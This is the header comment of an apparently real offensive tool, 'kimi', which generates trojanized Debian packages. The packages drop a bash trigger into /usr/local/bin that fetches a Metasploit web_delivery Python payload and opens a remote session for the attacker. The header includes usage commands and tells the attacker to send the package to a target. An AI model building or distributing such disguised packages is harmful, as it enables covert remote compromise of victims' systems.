###
# kimi - Malicious Debian Package generator v1.1
# Script to generate malicious debian packages (unix systems)
# "Kimi is the name inspired from 'Kimimaro' one of my favorite charaters from anime 'Naruto'"
#
#    Kimi is a script which generates Malicious debian packages for metasploit
#    which consists of a bash file with one python call. The bash file is deployed
#    into "/usr/local/bin" directory. The Bash file injected acts like a 'trigger'
#    of msf web_delivery module that delivers a python payload to target and when
#    executed by victim the attacker will get is session open in return.
#
#    Kimi basically depends upon web_delivery module and everything is automated. 
#    All the attacker needs to do is to send the debian agent to target and start
#    the conrrespondent handler(web_delivery) 'sudo msfconsole -r handler.rc'
#
#    Plus Points ::
#    -- Fully indiependent. Means user no need to install any debian package creator
#    -- Can be integrated with any payload generator easily due to engagements of argument's
#
#
# GENERATING MALICIOUS PAYLOAD ::
#     dreamer@mindless ~$ sudo python kimi.py -n name -l 127.0.0.1 -V 1.0
#
# EXECUTING METASPLOIT HANDLER ::
#     dreamer@mindless ~$ sudo msfconsole -r handler.rc
#

#
#
# TESTED ON ::
#    Linux Mint 17.2 Cinnamon (Ubuntu 14.04) 
#    ParrotOS (Debian Jessie)
#    Kali rolling (2.0) 
#
#    NOTE :: This project was made to be integrated in Venom Shellcode Generator 1.0.13.
#    But it can be used as an standalone program also.
